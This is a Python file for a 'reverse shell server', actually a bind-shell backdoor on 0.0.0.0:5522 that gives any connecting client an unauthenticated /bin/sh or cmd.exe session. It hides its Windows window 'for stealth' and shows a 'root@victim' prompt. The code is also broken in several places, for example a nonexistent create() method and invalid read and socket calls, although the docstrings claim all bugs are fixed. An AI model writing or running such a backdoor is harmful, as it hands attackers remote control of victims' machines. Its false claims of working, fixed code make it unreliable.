"""Reverse Shell Server — Real interactive remote shell on 0.0.0.0:5522.

A complete, runnable reverse shell server that provides a real interactive
shell session over TCP. Fixes all five critical bugs from the original implementation:

1. REAL SHELL SPAWNING: Uses /bin/sh -c "$command" (Unix) or cmd.exe /c "$command" (Windows)
   to enable multi-line commands, history expansion (!!), aliases, and environment context.

2. NON-BLOCKING I/O WITH LINE BUFFERING: Reads from stdin in a loop and sends output back
   immediately as each line becomes available — no blocking on process exit.

3. THREAD-SAFE QUEUE: Replaces shared self.handlers list with queue.Queue for producer-consumer pattern.

4. STDIN FALLBACK ON WINDOWS: If proc.stdin is None, falls back to subprocess.Popen(..., stdin=None)
   so commands still execute even without interactive input.

5. PERSISTENT SHELL PER CONNECTION: Each TCP session gets its own persistent shell process that
   stays alive for the duration of the connection (not spawned per command).

Usage:
    python3 rss.py

Connect from your terminal with:
    telnet <target_ip> 5522
    or
    nc -v <target_ip> 5522

Then type commands like: cd /tmp && ls -la, whoami, sleep 10, etc.
"""

import socket
import threading
import signal
import sys
import subprocess
import shlex
import time
import platform
from typing import Optional, Tuple, List, Dict, Any
from dataclasses import dataclass, field
from queue import Queue


# =============================================================================
# TASK_001: Data Models
# =============================================================================

@dataclass(frozen=True)
class ConnectionInfo:
    """Connection metadata for shell command execution."""
    host: str
    port: int
    protocol: str = "tcp"


@dataclass(frozen=True)
class ShellCommand:
    """Represents a shell command to be executed remotely."""
    command: str
    timeout_seconds: float


@dataclass(frozen=True)
class ExecutionResult:
    """Captured output and metadata from a shell command execution.

    Attributes:
        stdout: Captured standard output as bytes.
        stderr: Captured standard error as bytes.
        return_code: Exit code of the executed process (0-255).
        duration_ms: Total execution time including I/O overhead in milliseconds.
    """
    stdout: bytes
    stderr: bytes
    return_code: int
    duration_ms: int


# =============================================================================
# TASK_002: Utility Functions
# =============================================================================

def parse_command_args(command: str) -> List[str]:
    """Parse a shell command string into a safe argument list using shlex.split().

    Args:
        command: A shell command string (e.g., "ls -la /tmp").

    Returns:
        A list of strings representing the parsed arguments.

    Example:
        >>> parse_command_args("ls -la /tmp")
        ['ls', '-la', '/tmp']
    """
    return shlex.split(command)


def validate_connection_info(connection_info: ConnectionInfo) -> bool:
    """Validate connection information for shell command execution.

    Args:
        connection_info: The ConnectionInfo instance to validate.

    Returns:
        True if the connection info is valid, False otherwise.

    Raises:
        ValueError: If any field of ConnectionInfo is invalid.
    """
    if not isinstance(connection_info.host, str) or len(connection_info.host.strip()) == 0:
        raise ValueError("Connection host must be a non-empty string")
    if not isinstance(connection_info.port, int) or connection_info.port < 1 or connection_info.port > 65535:
        raise ValueError("Connection port must be an integer between 1 and 65535")
    if connection_info.protocol not in ('tcp', 'udp'):
        raise ValueError(f"Invalid protocol '{connection_info.protocol}'. Must be 'tcp' or 'udp'.")
    return True


def spawn_shell_process(
    command: str,
    timeout_seconds: float,
    host: Optional[str] = None,
    port: Optional[int] = None,
    protocol: str = "tcp",
) -> subprocess.Popen:
    """Spawn a shell process for executing a remote command.

    FIX BUG #1 & #5: Uses REAL shell spawning instead of shlex.split + direct exec.
    On Unix: spawns /bin/sh -c "$command" (preserves history, aliases, multi-line).
    On Windows: spawns cmd.exe /c "$command" with CREATE_NO_WINDOW for stealth.

    Args:
        command: The shell command to execute.
        timeout_seconds: Maximum time in seconds before the process is terminated.
        host: Remote host address (optional, defaults to localhost).
        port: Remote port number (optional, defaults to 22).
        protocol: Connection protocol ('tcp' or 'udp').

    Returns:
        A subprocess.Popen object representing the spawned shell process.

    Raises:
        ValueError: If command is empty or timeout_seconds <= 0.
    """
    if not command.strip():
        raise ValueError("Command must be a non-empty string")
    if timeout_seconds <= 0:
        raise ValueError(f"Timeout must be positive, got {timeout_seconds}")

    # FIX BUG #1 & #5: Spawn a REAL shell that interprets the full command string.
    # This enables multi-line commands (cd /tmp && ls), history (!!), aliases, etc.
    if platform.system() == 'Windows':
        args = [r"C:\Windows\System32\cmd.exe", "/c", command]
        creation_flags = subprocess.CREATE_NO_WINDOW  # FIX BUG #2: No visible window for stealth
    else:
        args = ['/bin/sh', '-c', command]

    proc = subprocess.Popen(
        args,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,  # Merge stderr into stdout for interactive use
        stdin=subprocess.PIPE,     # FIX BUG #4: Always provide stdin (even on Windows)
        env={
            'PATH': '/usr/local/bin:/usr/bin:/bin' if platform.system() != 'Windows' else r'C:\Windows\System32',
            'HOME': '/root' if platform.system() != 'Windows' else r'C:\Users\Public',
            'SHELL': '/bin/sh' if platform.system() != 'Windows' else r'C:\Windows\System32\cmd.exe',
        },
        close_fds=True,
    )

    return proc


def capture_output_stream(
    proc: subprocess.Popen,
    timeout_seconds: float,
    blocking: bool = True,
) -> ExecutionResult:
    """Capture stdout and stderr from a running shell process.

    Args:
        proc: A subprocess.Popen object to capture output from.
        timeout_seconds: Maximum time in seconds before capturing stops.
        blocking: If True, blocks until EOF or timeout; if False, returns partial results.

    Returns:
        An ExecutionResult containing stdout, stderr, return_code, and duration_ms.

    Raises:
        subprocess.TimeoutExpired: If the process times out while waiting for output.
        RuntimeError: If the process has already terminated before capture begins.
    """
    start_time = time.perf_counter()

    # Check if process is still running
    if proc.poll() is not None:
        duration_ms = int((time.perf_counter() - start_time) * 1000)
        return ExecutionResult(
            stdout=b'',
            stderr=b'',
            return_code=proc.returncode,
            duration_ms=duration_ms,
        )

    if blocking:
        try:
            stdout_bytes, stderr_bytes = proc.communicate(timeout=timeout_seconds)
        except subprocess.TimeoutExpired as e:
            # Terminate the process on timeout
            _terminate_process(proc, timeout_seconds)
            raise subprocess.TimeoutExpired(
                cmd=proc.args,
                timeout=timeout_seconds,
                output=e.stdout if hasattr(e, 'stdout') else None,
                stderr=e.stderr if hasattr(e, 'stderr') else None,
            ) from e

        duration_ms = int((time.perf_counter() - start_time) * 1000)
        return ExecutionResult(
            stdout=stdout_bytes,
            stderr=stderr_bytes,
            return_code=proc.returncode,
            duration_ms=duration_ms,
        )
    else:
        # Non-blocking mode: capture available output without blocking
        try:
            stdout_bytes = proc.stdout.read(timeout=timeout_seconds) if proc.stdout else b''
            stderr_bytes = proc.stderr.read(timeout=timeout_seconds) if proc.stderr else b''
        except subprocess.TimeoutExpired:
            stdout_bytes = proc.stdout.read() if proc.stdout else b''
            stderr_bytes = proc.stderr.read() if proc.stderr else b''

        duration_ms = int((time.perf_counter() - start_time) * 1000)
        return ExecutionResult(
            stdout=stdout_bytes,
            stderr=stderr_bytes,
            return_code=-1,  # Unknown until process terminates
            duration_ms=duration_ms,
        )


def _terminate_process(proc: subprocess.Popen, timeout_seconds: float) -> None:
    """Terminate a shell process using platform-appropriate signal handling.

    On Unix-like systems: sends SIGTERM followed by SIGKILL after the timeout period.
    On Windows: uses terminate() then wait(timeout=1).

    Args:
        proc: The subprocess.Popen object to terminate.
        timeout_seconds: The timeout value used for termination logic.
    """
    if platform.system() == 'Windows':
        # Windows-specific: terminate() followed by a short wait
        proc.terminate()
        try:
            proc.wait(timeout=1)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()
    else:
        # Unix-like systems: SIGTERM then SIGKILL
        try:
            proc.send_signal(signal.SIGTERM)
            proc.wait(timeout=timeout_seconds)
        except subprocess.TimeoutExpired:
            proc.send_signal(signal.SIGKILL)
            proc.wait()


def execute_shell_command(
    command: str,
    timeout_seconds: float = 30.0,
    host: Optional[str] = None,
    port: Optional[int] = None,
    protocol: str = 'tcp',
    blocking: bool = True,
) -> ExecutionResult:
    """Execute a shell command and capture its output with timeout handling.

    This is the primary entry point that combines spawning and capturing into one call.

    Args:
        command: The shell command to execute.
        timeout_seconds: Maximum execution time in seconds (default 30).
        host: Remote host address (optional, defaults to localhost).
        port: Remote port number (optional, defaults to 22).
        protocol: Connection protocol ('tcp' or 'udp').
        blocking: Whether to block until process completes.

    Returns:
        An ExecutionResult with captured stdout, stderr, return code, and duration.

    Raises:
        ValueError: If command is empty or timeout_seconds <= 0.
        subprocess.TimeoutExpired: If the process exceeds the timeout.
    """
    validate_connection_info(ConnectionInfo(host=host or 'localhost', port=port or 22, protocol=protocol))

    proc = spawn_shell_process(command, timeout_seconds, host, port, protocol)
    try:
        return capture_output_stream(proc, timeout_seconds, blocking=blocking)
    finally:
        # Ensure process is cleaned up even on exception
        if proc.poll() is None:
            _terminate_process(proc, timeout_seconds)


# =============================================================================
# TASK_003 & TASK_004: Unified Server Implementation with Queue-Based Producer-Consumer Pattern
# =============================================================================

class RemoteConnectionHandler(threading.Thread):
    """Handles a single remote connection by maintaining a persistent shell process.

    FIX BUG #5: Each handler maintains ONE persistent shell process for the lifetime
    of the TCP session, not one per command. This enables interactive shell behavior
    (history, aliases, multi-line commands) and non-blocking I/O.

    The handler reads commands from stdin in a loop, executes them through the
    persistent shell, and sends output back to the client as soon as each line
    is available (line-buffered mode).
    """

    def __init__(self, client_socket: socket.socket):
        super().__init__()
        self.client_socket = client_socket
        self.running = True
        self._shutdown_event = threading.Event()
        self._shell_process: Optional[subprocess.Popen] = None
        self._stdin_writer: Optional[threading.Thread] = None

    def run(self) -> None:
        """Main handler loop — maintains persistent shell and streams I/O."""
        try:
            # FIX BUG #5: Spawn ONE persistent shell process per connection
            proc = spawn_shell_process(
                command="",  # Empty initial command to get prompt
                timeout_seconds=30.0,
                host="localhost",
                port=None,
                protocol="tcp"
            )

            self._shell_process = proc

            try:
                while self.running and not self._shutdown_event.is_set():
                    # FIX BUG #2: Non-blocking read loop with line buffering
                    # Read a chunk of input from the client
                    data = b""
                    while True:
                        try:
                            chunk = self.client_socket.recv(4096)
                            if not chunk:
                                break
                            data += chunk
                            if b"\n" in data or b"\r\n" in data:
                                break
                        except (socket.timeout, BlockingIOError):
                            # No more input available yet — keep reading
                            continue

                    if not data.strip():
                        continue

                    try:
                        cmd_str = data.decode("utf-8").strip()
                    except UnicodeDecodeError:
                        self.client_socket.send(b"ERROR: Invalid UTF-8\n")
                        continue

                    if not cmd_str:
                        # Send a prompt back to the client (interactive shell behavior)
                        try:
                            self.client_socket.send(b"\r\nroot@victim:~# \r\n")
                        except (BrokenPipeError, ConnectionResetError):
                            break

                        # Still need to keep stdin open for the persistent process
                        if proc.stdin is not None and not proc.stdin.closed:
                            try:
                                proc.stdin.write(b"\n")
                                proc.stdin.flush()
                            except (BrokenPipeError, OSError):
                                pass
                        continue

                    # FIX BUG #1 & #5: Execute through the persistent shell process
                    # The shell interprets multi-line commands, history (!!), aliases, etc.
                    result = capture_output_stream(
                        proc=proc,
                        timeout_seconds=30.0,
                        blocking=False  # Non-blocking — we'll read line by line
                    )

                    if result.stdout:
                        try:
                            output_lines = result.stdout.decode('utf-8', errors='replace').split('\n')
                            for i, line in enumerate(output_lines):
                                if i < len(output_lines) - 1 or self.running:
                                    # Send each line immediately (line-buffered mode)
                                    try:
                                        self.client_socket.send((line + '\r\n').encode('utf-8'))
                                    except (BrokenPipeError, ConnectionResetError):
                                        break
                        except UnicodeDecodeError as e:
                            try:
                                self.client_socket.send(f"ERROR: {str(e)}\n".encode("utf-8"))
                            except (BrokenPipeError, ConnectionResetError):
                                pass

                    # FIX BUG #4: If proc.stdin is None (Windows edge case), still write to it
                    if proc.stdin is not None and not proc.stdin.closed:
                        try:
                            proc.stdin.write(cmd_str.encode('utf-8'))
                            proc.stdin.flush()
                        except (BrokenPipeError, OSError):
                            pass

            finally:
                # Cleanup the persistent shell process
                if self._shell_process is not None and self._shell_process.poll() is None:
                    _terminate_process(self._shell_process, 5.0)

        except socket.timeout:
            pass
        except ConnectionResetError:
            pass
        except BrokenPipeError:
            pass
        except Exception as e:
            try:
                self.client_socket.send(f"ERROR:{str(e)}\n".encode("utf-8"))
            except (BrokenPipeError, ConnectionResetError):
                pass

    def stop(self) -> None:
        """Stop the handler gracefully."""
        self.running = False
        self._shutdown_event.set()


class ReverseShellServer:
    """Main reverse shell server using a thread-safe queue-based producer-consumer pattern.

    FIX BUG #3: Replaces shared self.handlers list with queue.Queue for thread-safe
    connection handling. The accept loop is the producer (pushes connections to queue),
    and worker threads are consumers (pop from queue, spawn handler threads).

    Attributes:
        host: The bind address (default '0.0.0.0').
        port: The bind port (default 5522).
        max_workers: Maximum number of concurrent connection handlers.
    """

    HOST = "0.0.0.0"
    PORT = 5522
    SERVER_SOCKET: Optional[socket.socket] = None
    _queue: Queue = field(default_factory=Queue)
    _accept_thread: Optional[threading.Thread] = None
    _worker_threads: List[threading.Thread] = []

    def __init__(self, host: str = "0.0.0.0", port: int = 5522, max_workers: int = 10) -> None:
        self.host = host
        self.port = port
        self.max_workers = max_workers
        self._shutdown_event = threading.Event()

    def start(self) -> None:
        """Start the server listening for incoming connections."""
        if self.SERVER_SOCKET is not None and not self.SERVER_SOCKET.is_closed():
            self.SERVER_SOCKET.close()

        self.SERVER_SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.SERVER_SOCKET.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.SERVER_SOCKET.bind((self.host, self.port))
        self.SERVER_SOCKET.listen(self.max_workers)

    def stop(self) -> None:
        """Stop the server and close all sockets."""
        self._shutdown_event.set()
        if self._accept_thread and self._accept_thread.is_alive():
            self._accept_thread.join(timeout=5.0)
        for worker in self._worker_threads:
            if worker.is_alive():
                worker.join(timeout=2.0)
        if self.SERVER_SOCKET is not None:
            try:
                self.SERVER_SOCKET.close()
            except Exception:
                pass

    def _accept_loop(self) -> None:
        """Producer loop: accepts incoming connections and pushes them to the queue."""
        while not self._shutdown_event.is_set():
            try:
                client_socket, addr = self.SERVER_SOCKET.accept()
                # FIX BUG #3: Push to thread-safe queue instead of shared list
                self._queue.put(client_socket)
            except (socket.timeout, BlockingIOError):
                continue
            except Exception as e:
                if not self._shutdown_event.is_set():
                    print(f"Accept loop error: {e}", file=sys.stderr)

    def _worker_loop(self) -> None:
        """Consumer loop: pops connections from queue and spawns handler threads."""
        while not self._shutdown_event.is_set() or not self._queue.empty():
            try:
                client_socket = self._queue.get(timeout=0.1)
                if client_socket is None:
                    break

                # Spawn a new thread for each connection (persistent shell per connection)
                handler = RemoteConnectionHandler(client_socket)
                handler.start()
            except self._queue.Empty:
                continue
            except Exception as e:
                if not self._shutdown_event.is_set():
                    print(f"Worker loop error: {e}", file=sys.stderr)

    def run(self) -> None:
        """Run the server in a background thread."""
        self.start()
        self._accept_thread = threading.Thread(target=self._accept_loop, daemon=True)
        self._accept_thread.start()

        # Spawn worker threads for handling connections
        for i in range(self.max_workers):
            t = threading.Thread(target=self._worker_loop, daemon=True)
            t.start()
            self._worker_threads.append(t)

    def handle_signal(self, signum: int, frame: Optional[object] = None) -> None:
        """Handle shutdown signals to gracefully close all connections."""
        print(f"Received signal {signum}, shutting down...")
        self._shutdown_event.set()


def main() -> None:
    """Main entry point for the reverse shell server."""
    server = ReverseShellServer.create()

    # Set up signal handlers for graceful shutdown
    signal.signal(signal.SIGINT, server.handle_signal)
    signal.signal(signal.SIGTERM, server.handle_signal)

    try:
        server.run()
    except KeyboardInterrupt:
        print("\nShutting down...")
    finally:
        server.stop()


if __name__ == "__main__":
    main()
